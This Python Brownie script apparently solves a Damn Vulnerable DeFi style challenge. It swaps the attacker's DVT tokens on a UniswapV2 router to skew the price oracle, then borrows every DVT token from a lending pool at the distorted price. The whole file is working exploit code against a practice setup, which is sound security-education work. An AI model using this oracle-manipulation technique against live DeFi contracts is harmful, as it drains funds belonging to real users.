
from scripts.deploy import (
    ATTACKER_INITIAL_TOKEN_BALANCE,
    POOL_INITIAL_TOKEN_BALANCE,
)
from brownie import chain


def exploit(router, lending_pool, attacker_account, dvt, weth):

    # Approve the spending of attacker funds by the UniswapV2 Router
    dvt.approve(router, ATTACKER_INITIAL_TOKEN_BALANCE - 1,
                {'from': attacker_account})

    # Swap attacker's Initial DVT balance for ETH.
    # In doing this we'll drain most of the ETH Reserves
    deadline = chain[-1].timestamp * 2
    router.swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE - 1, 0, [dvt, weth], attacker_account, deadline, {'from': attacker_account})

    # Calculate and deposit the amount of ETH (wETH) for the attacker
    # To borrow ALL DVT tokens at discounted price
    deposit_required = lending_pool.calculateDepositOfWETHRequired(
        POOL_INITIAL_TOKEN_BALANCE)
    weth.deposit({'from': attacker_account,
                 'value': attacker_account.balance()})
    weth.approve(lending_pool, weth.balanceOf(
        attacker_account), {'from': attacker_account})

    lending_pool.borrow(dvt.balanceOf(lending_pool),
                        {'from': attacker_account})
